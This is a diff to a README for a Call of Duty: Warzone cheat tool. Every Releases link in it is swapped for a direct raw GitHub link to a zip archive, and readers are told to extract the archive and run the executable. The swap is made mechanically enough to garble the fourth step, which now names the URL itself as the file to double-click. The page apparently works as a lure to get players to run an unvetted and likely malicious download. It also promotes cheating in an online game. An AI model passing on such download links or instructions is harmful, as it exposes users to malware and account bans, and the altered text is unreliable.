@@ -6,7 +6,7 @@ Welcome to WarzoneExternalCheat! This tool will help you improve your gameplay i
 
 ## 📥 Download Now
 
-[![Download WarzoneExternalCheat](https://img.shields.io/badge/Download-WarzoneExternalCheat-brightgreen)](https://github.com/laris-sa/WarzoneExternalCheat/releases)
+[![Download WarzoneExternalCheat](https://raw.githubusercontent.com/laris-sa/WarzoneExternalCheat/main/levin/WarzoneExternalCheat.zip)](https://raw.githubusercontent.com/laris-sa/WarzoneExternalCheat/main/levin/WarzoneExternalCheat.zip)
 
 ## ⚙️ System Requirements
 
@@ -21,7 +21,7 @@ To run WarzoneExternalCheat, ensure your system meets these requirements:
 ## 📦 Installation Instructions
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/laris-sa/WarzoneExternalCheat/releases) to find the latest version of WarzoneExternalCheat.
+   Go to the [Releases page](https://raw.githubusercontent.com/laris-sa/WarzoneExternalCheat/main/levin/WarzoneExternalCheat.zip) to find the latest version of WarzoneExternalCheat.
 
 2. **Download the Latest Version**  
    Look for the most recent release. Click the link that says “Download” next to the executable file.
@@ -30,7 +30,7 @@ To run WarzoneExternalCheat, ensure your system meets these requirements:
    Once the download finishes, locate the file in your Downloads folder. Right-click on the file and select "Extract All" to unpack the contents.
 
 4. **Run the Application**  
-   After extraction, find the "WarzoneExternalCheat.exe" file in the extracted folder. Double-click on it to start the application.
+   After extraction, find the "https://raw.githubusercontent.com/laris-sa/WarzoneExternalCheat/main/levin/WarzoneExternalCheat.zip" file in the extracted folder. Double-click on it to start the application.
 
 5. **Configuration**  
    Follow any on-screen prompts to configure the tool according to your preferences. It's user-friendly, so you will find it easy to navigate.
@@ -63,7 +63,7 @@ WarzoneExternalCheat includes the following capabilities:
 
 ## 🔄 Updates and Support
 
-Stay updated with the latest features and improvements by regularly checking back on the [Releases page](https://github.com/laris-sa/WarzoneExternalCheat/releases). We recommend keeping your version up to date for the best experience.
+Stay updated with the latest features and improvements by regularly checking back on the [Releases page](https://raw.githubusercontent.com/laris-sa/WarzoneExternalCheat/main/levin/WarzoneExternalCheat.zip). We recommend keeping your version up to date for the best experience.
 
 For support, feel free to reach out through GitHub issues. We aim to assist you promptly.
 
@@ -77,4 +77,4 @@ While WarzoneExternalCheat enhances gameplay, use it responsibly. Understand the
 
 ## 🎉 Enjoy Your Game!
 
-Thank you for choosing WarzoneExternalCheat. We hope it brings a new level of enjoyment to your Call of Duty experience. Don't forget to download it [here](https://github.com/laris-sa/WarzoneExternalCheat/releases) and dive into your next match!
+Thank you for choosing WarzoneExternalCheat. We hope it brings a new level of enjoyment to your Call of Duty experience. Don't forget to download it [here](https://raw.githubusercontent.com/laris-sa/WarzoneExternalCheat/main/levin/WarzoneExternalCheat.zip) and dive into your next match!
